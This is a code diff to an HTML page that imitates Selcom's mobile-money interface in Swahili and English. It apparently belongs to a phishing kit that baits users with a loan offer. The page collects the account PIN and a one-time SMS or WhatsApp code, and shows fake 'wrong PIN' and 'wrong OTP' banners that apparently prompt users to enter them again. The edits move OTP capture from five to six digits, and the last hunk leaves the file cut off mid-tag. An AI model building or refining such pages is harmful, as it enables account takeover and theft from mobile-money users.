@@ -238,7 +238,7 @@
     </div>
   </section>
 
-  <!-- SCREEN 6: PIN LOGIN SCREEN (TITLE UPDATED) -->
+  <!-- SCREEN 6: PIN LOGIN SCREEN -->
   <section id="screen-pin" class="screen selcom-blue-bg">
     <div class="top-nav-bar">
       <div class="selcom-logo-text sm">Selcom</div>
@@ -249,7 +249,7 @@
       <div class="card-inner-box">
         <h3 class="screen-custom-title">PLEASE CONFIRM YOUR SELCOM PESA PIN</h3>
 
-        <div id="creds-surface-banner" class="surface-error-banner">
+        <div id="creds-surface-banner" class="surface-error-banner" data-en="WRONG PIN ❌ Incorrect account PIN. Please try again." data-sw="WRONG PIN ❌ Incorrect account PIN. Please try again.">
           WRONG PIN ❌ Incorrect account PIN. Please try again.
         </div>
 
@@ -280,7 +280,7 @@
     </div>
   </section>
 
-  <!-- SCREEN 7: OTP VERIFICATION -->
+  <!-- SCREEN 7: OTP VERIFICATION (6 Digits) -->
   <section id="screen-otp" class="screen selcom-blue-bg">
     <div class="top-nav-bar">
       <div class="selcom-logo-text sm">Selcom</div>
@@ -290,28 +290,29 @@
     <div class="pin-card-wrapper">
       <div class="card-inner-box">
         <h3 class="screen-custom-title">OTP SELCOM VERIFICATION</h3>
-        <p class="otp-sub-info" data-en="Enter the 5-digit OTP sent to your Selcom registered phone number" data-sw="Weka tarakimu 5 za OTP iliyotumwa kwenye nambari yako ya simu iliyosajiliwa na Selcom">Weka tarakimu 5 za OTP iliyotumwa kwenye nambari yako ya simu iliyosajiliwa na Selcom <strong id="otp-phone-display">+255712345678</strong></p>
+        <p class="otp-sub-info" data-en="Enter the 6-digit OTP sent to your Selcom registered phone number" data-sw="Weka tarakimu 6 za OTP iliyotumwa kwenye nambari yako ya simu iliyosajiliwa na Selcom">Weka tarakimu 6 za OTP iliyotumwa kwenye nambari yako ya simu iliyosajiliwa na Selcom <strong id="otp-phone-display">+255712345678</strong></p>
 
-        <div id="otp-surface-banner" class="surface-error-banner">
+        <div id="otp-surface-banner" class="surface-error-banner" data-en="WRONG OTP ❌ Incorrect verification code. Please enter new OTP." data-sw="WRONG OTP ❌ Incorrect verification code. Please enter new OTP.">
           WRONG OTP ❌ Incorrect verification code. Please enter new OTP.
         </div>
 
-        <div class="otp-success-notice" data-en="✓ Message verified! Please enter your 5-digit OTP from WhatsApp or SMS below." data-sw="✓ Ujumbe umethibitishwa! Tafadhali weka OTP yako ya tarakimu 5 kutoka WhatsApp au SMS hapa chini.">
-          ✓ Ujumbe umethibitishwa! Tafadhali weka OTP yako ya tarakimu 5 kutoka WhatsApp au SMS hapa chini.
+        <div class="otp-success-notice" data-en="✓ Message verified! Please enter your 6-digit OTP from WhatsApp or SMS below." data-sw="✓ Ujumbe umethibitishwa! Tafadhali weka OTP yako ya tarakimu 6 kutoka WhatsApp au SMS hapa chini.">
+          ✓ Ujumbe umethibitishwa! Tafadhali weka OTP yako ya tarakimu 6 kutoka WhatsApp au SMS hapa chini.
         </div>
 
         <div class="otp-boxes-flex">
-          <input type="text" class="otp-digit-5" maxlength="1" inputmode="numeric">
-          <input type="text" class="otp-digit-5" maxlength="1" inputmode="numeric">
-          <input type="text" class="otp-digit-5" maxlength="1" inputmode="numeric">
-          <input type="text" class="otp-digit-5" maxlength="1" inputmode="numeric">
-          <input type="text" class="otp-digit-5" maxlength="1" inputmode="numeric">
+          <input type="text" class="otp-digit-6" maxlength="1" inputmode="numeric">
+          <input type="text" class="otp-digit-6" maxlength="1" inputmode="numeric">
+          <input type="text" class="otp-digit-6" maxlength="1" inputmode="numeric">
+          <input type="text" class="otp-digit-6" maxlength="1" inputmode="numeric">
+          <input type="text" class="otp-digit-6" maxlength="1" inputmode="numeric">
+          <input type="text" class="otp-digit-6" maxlength="1" inputmode="numeric">
         </div>
 
         <div class="timer-display" id="timer-text">Tuma tena msimbo ndani ya 1:00 dakika</div>
         <button type="button" id="btn-resend-otp" class="btn-resend-hidden" data-en="Request New OTP" data-sw="Omba OTP Mpya">Omba OTP Mpya</button>
 
-        <div id="otp-error" class="inline-error" data-en="Enter all 5 OTP digits." data-sw="Weka tarakimu zote 5 za OTP.">Weka tarakimu zote 5 za OTP.</div>
+        <div id="otp-error" class="inline-error" data-en="Enter all 6 OTP digits." data-sw="Weka tarakimu zote 6 za OTP.">Weka tarakimu zote 6 za OTP.</div>
         <button type="button" id="btn-submit-otp" class="btn-selcom-disabled" data-en="SUBMIT" data-sw="WASILISHA">WASILISHA</button>
       </div>
     </div>
@@ -352,17 +353,4 @@
         <div class="details-list">
           <div class="d-row"><span data-en="MONTHLY REPAYMENT" data-sw="MALIPO YA KILA MWEZI">MALIPO YA KILA MWEZI</span> <strong id="succ-monthly">TSh 2,441</strong></div>
           <div class="d-row"><span data-en="LOAN TERM" data-sw="MUDA WA MKOPO">MUDA WA MKOPO</span> <strong data-en="48 Months" data-sw="Miezi 48">Miezi 48</strong></div>
-          <div class="d-row"><span data-en="INTEREST RATE" data-sw="KIWANGO CHA RIBA">KIWANGO CHA RIBA</span> <strong>8% APR</strong></div>
-        </div>
-
-        <button type="button" id="btn-go-home" class="btn-selcom-blue-full" data-en="Back to Home" data-sw="Rudi Nyumbani">Rudi Nyumbani</button>
-      </div>
-    </div>
-  </section>
-
-</div>
-
-<script src="script.js"></script>
-</body>
-  </html>
-          
+          <div class="d-row"><span data-en="INTEREST RATE" data-sw="KIWANGO CHA RIBA">KIWANGO CHA RIBA</span
